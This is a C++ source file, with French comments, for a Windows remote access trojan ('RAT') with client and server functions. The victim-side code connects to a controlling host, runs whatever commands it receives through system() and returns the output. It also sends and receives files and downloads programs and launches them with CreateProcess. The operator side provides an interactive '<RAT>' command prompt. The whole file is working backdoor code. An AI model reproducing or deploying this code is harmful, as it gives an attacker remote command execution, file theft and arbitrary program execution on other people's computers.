/*********************************************************************
RATFonctions.cpp - Fonctions RATS pour le client et le serveur
écrit par: Pierre-Marc Laforest
Date: 2017-03-24
**********************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <winsock.h>
#include <iostream>
#include <tchar.h>
#include <locale>
#include <codecvt>
#include <windows.h> 
#include <fstream>
#include <string>
#include  <direct.h>
#include <process.h>  
#include "comClientServer.h"
#include "RATFonctions.h"

#define BUFF_SIZE 1024
#define COMMANDE_MAX_CHARS 1000
#define ARGUMENTS_MAX_CHARS 1000
#define CHEMIN_DOSSIER_MAX 2000
#define BUFF_SIZE 1024
#define PORT_NUMB 3000
#define MAX_COMMANDE 500
#define MAX_ARGS 500
#define FICHIER_RESULTAT_COMMANDE "resultatsCommande.txt"
#define FICHIER_CMD_ENREGISTREES "outputCommand.txt"

using namespace std;

// Helper macro for displaying errors
#define PRINTERROR(s)	cout<<"\n"<<s<<":"<<WSAGetLastError()

// Current working directory (cwd)
extern char rootDirectory[1024];

void RATServer_initComAvecClient(char *szServer, short nPort, SOCKET* remoteSocketServerPtr)
{
	cout << "Connection OK -> " << szServer << " port " << nPort << '\n' <<
		"En attente d'une premiere commande !\n\n" << std::flush;

	// Find the server
	LPHOSTENT lpHostEntry;

	lpHostEntry = gethostbyname(szServer);
	if (lpHostEntry == NULL)
	{
		PRINTERROR("gethostbyname()");
		return;
	}

	// Create a TCP/IP stream socket
	*remoteSocketServerPtr = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (*remoteSocketServerPtr == INVALID_SOCKET)
	{
		PRINTERROR("socket()");
		return;
	}

	SOCKADDR_IN saServer;

	saServer.sin_family = AF_INET;
	saServer.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
	saServer.sin_port = htons(nPort);

	int nRet = connect(*remoteSocketServerPtr, (LPSOCKADDR)&saServer, sizeof(struct sockaddr));
	if (nRet == SOCKET_ERROR)
	{
		PRINTERROR("socket()");
		closesocket(*remoteSocketServerPtr);
		return;
	}

	return;
}

void RATClient_initComAvecServer(short nPort, SOCKET* listenSocketClientPtr, SOCKET* remoteSocketClientPtr)
{
	// Create a TCP/IP stream socket to "listen" with
	*listenSocketClientPtr = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (*listenSocketClientPtr == INVALID_SOCKET)
	{
		PRINTERROR("socket()");
		return;
	}

	// Fill in the address structure
	SOCKADDR_IN saServer;
	saServer.sin_family = AF_INET;
	saServer.sin_addr.s_addr = INADDR_ANY;
	saServer.sin_port = htons(nPort);

	int nRet;
	nRet = bind(*listenSocketClientPtr, (LPSOCKADDR)&saServer, sizeof(struct sockaddr));
	if (nRet == SOCKET_ERROR)
	{
		PRINTERROR("bind()");
		closesocket(*listenSocketClientPtr);
		return;
	}

	int nLen;
	nLen = sizeof(SOCKADDR);
	char szBuf[BUFF_SIZE];
	char hostName[BUFF_SIZE];

	nRet = gethostname(szBuf, sizeof(szBuf));
	if (nRet == SOCKET_ERROR)
	{
		PRINTERROR("gethostname()");
		closesocket(*listenSocketClientPtr);
		return;
	}
	strcpy_s(hostName, szBuf);

	nRet = listen(*listenSocketClientPtr, SOMAXCONN);
	if (nRet == SOCKET_ERROR) {
		PRINTERROR("listen()");
		closesocket(*listenSocketClientPtr);
		return;
	}

	*remoteSocketClientPtr = accept(*listenSocketClientPtr, NULL, NULL);
	if (*remoteSocketClientPtr == INVALID_SOCKET)
	{
		PRINTERROR("accept()");
		closesocket(*listenSocketClientPtr);
		return;
	}

	cout << "Connection OK -> " << hostName << " port " << nPort << "\n\n" << std::flush;

	return;
}

void separeCommandeEtArguments(char *commandeBuf, int lengthOfCommandeBuf, char *argumentsBuf)
{
	int countChar = 0;
	char *ptrToCommande = commandeBuf;
	char *ptrToArguments;

	while (*ptrToCommande != ' ' && *ptrToCommande != '\0')
		ptrToCommande++;

	if (*ptrToCommande == ' ')
	{
		ptrToArguments = ptrToCommande;;
		ptrToArguments++; // On passe la ligne blanche
		strcpy_s(argumentsBuf, lengthOfCommandeBuf, ptrToArguments);
		*ptrToCommande = '\0';
		return;
	}
	else if (*ptrToCommande == '\0')
	{
		memset(argumentsBuf, 0, sizeof(argumentsBuf));
		return;
	}
}

void RATClient_envoiCommandes(char *dossierCourant, char *commandeAExecuter, int lengthCommande, char *argumentsBuf, SOCKET remoteSocketClient)
{	
	memset(commandeAExecuter, 0, sizeof(commandeAExecuter));
	memset(argumentsBuf, 0, sizeof(argumentsBuf));

	cout << "<RAT>" << dossierCourant << "> " << std::flush;
	cin.getline(commandeAExecuter, lengthCommande);
	stripNewLine(commandeAExecuter);

	// On decide de ne pas envoyer de commande
	if (strcmp(commandeAExecuter, "") == 0)	
	{
		memset(commandeAExecuter, 0, lengthCommande);
		memset(argumentsBuf, 0, lengthCommande);
		return;
	}
		
	// Envoi de la commande
	int nRet = envoiStrParSocket(commandeAExecuter, remoteSocketClient);
	if (nRet == -1) return;

	// On separe la commande des arguments
	separeCommandeEtArguments(commandeAExecuter, lengthCommande, argumentsBuf);

	return;
}

void RATServer_receptionCommandes(char *commandeBuf, int lengthOfCommande, char *argumentsBuf, SOCKET remoteSocketServer)
{
	memset(commandeBuf, 0, lengthOfCommande);

	//Reception de la commande
	int nRet = receptionStrParSocket(commandeBuf, remoteSocketServer);
	if (nRet == -1) exit(-1);

	// Separe la commande des arguments de la commande
	separeCommandeEtArguments(commandeBuf, lengthOfCommande, argumentsBuf);

	return;
}

int RATClient_traiteCommandes(char *commandeAExecuter, char *argumentsCommande, char *dossierCourant, SOCKET remoteSocketClient)
{
	if (strcmp(commandeAExecuter, "cd") == 0)
	{
		FILE* fichierALire;
		char readBuf[1024];

		receptionFichierParSocket(FICHIER_RESULTAT_COMMANDE, remoteSocketClient);

		memset(readBuf, 0, sizeof(readBuf));
		fopen_s(&fichierALire, FICHIER_RESULTAT_COMMANDE, "rb");
		fread(readBuf, 1, sizeof(readBuf) - 1, fichierALire);
		strcpy_s(dossierCourant, 1024, readBuf);
		fclose(fichierALire);

		return 0;
	}
	if (strcmp(commandeAExecuter, "") == 0)
	{
		return 0;
	}
	// commande a executer = q (quit)
	else if (strcmp(commandeAExecuter, "q") == 0)
	{ 
		cout << "Bye!";
		return -1;
	}
	// commande a executer = put
	else if (strcmp(commandeAExecuter, "put") == 0)
	{
		envoiFichierParSocket(argumentsCommande, remoteSocketClient);
	}

	// commande a executer = get
	else if (strcmp(commandeAExecuter, "get") == 0)
	{
		receptionFichierParSocket(argumentsCommande, remoteSocketClient);
	}
	// commande a executer = start
	else if (strcmp(commandeAExecuter, "start") == 0)
	{
		RATClient_execStart(argumentsCommande, remoteSocketClient);
	}
	else
	{
		// Reception et affichage du resultat de la commande
		receptionFichierParSocket(FICHIER_RESULTAT_COMMANDE, remoteSocketClient);
		afficheFichier(FICHIER_RESULTAT_COMMANDE);
	}

	return 0;
}


int RATServer_traiteCommandes(char *commandeBuf, char *argumentsBuf, SOCKET remoteSocketServer)
{
	char newCmd[1024];
	char pathToFile[1024];

	sprintf_s(pathToFile, "%s\\%s", rootDirectory, FICHIER_CMD_ENREGISTREES);

	if (strcmp(commandeBuf, "q") == 0)
		return -1;
	// cd
	else if (strcmp(commandeBuf, "cd") == 0)
		RATServer_execCd(argumentsBuf);
	// put
	else if (strcmp(commandeBuf, "put") == 0)
	{
		receptionFichierParSocket(argumentsBuf, remoteSocketServer);
		return 0;
	}
	// get
	else if (strcmp(commandeBuf, "get") == 0)
	{
		envoiFichierParSocket(argumentsBuf, remoteSocketServer);
		return 0;
	}
	else if (strcmp(commandeBuf, "start") == 0)
	{
		RATServer_execStart(argumentsBuf, remoteSocketServer);

	}
	// Toutes les autres commandes
	else
	{
		sprintf_s(newCmd, "%s %s%s%s%s", commandeBuf, argumentsBuf, " > ", pathToFile, " 2>&1");
		system(newCmd);
	}

	// Envoi du fichier de resultat
	envoiFichierParSocket(pathToFile, remoteSocketServer);

	return 0;
}


void RATServer_execCd(char* arguments)
{
	char pathToFile[1024];
	char my_current_path[1024];
	struct stat s;
	fstream fichierCmdExecutees;

	sprintf_s(pathToFile, "%s\\%s", rootDirectory, FICHIER_CMD_ENREGISTREES);

	fichierCmdExecutees.open(pathToFile, std::fstream::out | std::fstream::trunc);

	//Verifie si le parametre est un dossier valide
	if (stat(arguments, &s) == 0)
	{
		if (s.st_mode & S_IFDIR)
		{	
			// changement de repertoire
			_chdir(arguments);
			_getcwd(my_current_path, 1024);
		}
		else if (s.st_mode & S_IFREG)
		{
			strcpy_s(my_current_path, "Err!!r: Nom de repertoire non valide");
		}
		else
		{
			strcpy_s(my_current_path, "Err!!r: Le chemin d'acces specifie est introuvable");
		}
	}
	else
	{
		strcpy_s(my_current_path, "Err!!r: Le chemin d'acces specifie est introuvable");
	}

	// ecrire le repertoire courant ou le code derreur dans le fichier a envoyer
	fichierCmdExecutees << my_current_path;
	fichierCmdExecutees.close();

	return;
}

void RATServer_execStart(char *arguments, SOCKET remoteSocketServer)
{
	char nouveauNom[1024];
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// Reception du programme
	memset(nouveauNom, 0, sizeof(nouveauNom));
	strcpy_s(nouveauNom, sizeof(nouveauNom), arguments);						
	ajoutNoCopieNomProgramme(nouveauNom, 1);

	receptionFichierParSocket(nouveauNom, remoteSocketServer);

	// Conversion du string en wstring
	string tmpNouveauNom = string(nouveauNom);
	wstring wsNouveauNom(tmpNouveauNom.begin(), tmpNouveauNom.end());
	wsNouveauNom = wsNouveauNom + L'\0';
	LPTSTR szCmdline = _tcsdup(wsNouveauNom.c_str());
	
	// Start the child process. 
	if (!CreateProcess( szCmdline,   // No module name (use command line)
		NULL,       // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi)           // Pointer to PROCESS_INFORMATION structure
		)
	{
		printf("CreateProcess failed (%d).\n", GetLastError());
		return;
	}

	// Wait until child process exits.
	WaitForSingleObject(pi.hProcess, INFINITE);

	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return;
}

void RATClient_execStart(char *arguments, SOCKET remoteSocketClient)
{
	// Envoi du programme
	envoiFichierParSocket(arguments, remoteSocketClient);
	
	return;
}

void ajoutNoCopieNomProgramme(char *nomDuProgramme, int noCopie)
{
	char *ptrToNom = nomDuProgramme;
	char nomTemporaire[1000];
	char nomTemporaire2[1024];
	char extension[10];
	int noChar = 0;
	int noCharExt = 0;

	memset(nomTemporaire, 0, sizeof(nomTemporaire));
	memset(extension, 0, sizeof(extension));

	// avant darriver a lextension
	while (*ptrToNom != '.' && *ptrToNom != '\0')
		nomTemporaire[noChar++] = *ptrToNom++;

	while (*ptrToNom != '\0')
		extension[noCharExt++] = *ptrToNom++;

	if (extension[0] != '\0')
		sprintf_s(nomTemporaire2, "%s(%d)%s", nomTemporaire, noCopie, extension);
	else
		sprintf_s(nomTemporaire2, "%s(%d)", nomTemporaire, noCopie);

	strcpy_s(nomDuProgramme, sizeof(nomTemporaire2) - 1, nomTemporaire2);

	return;
}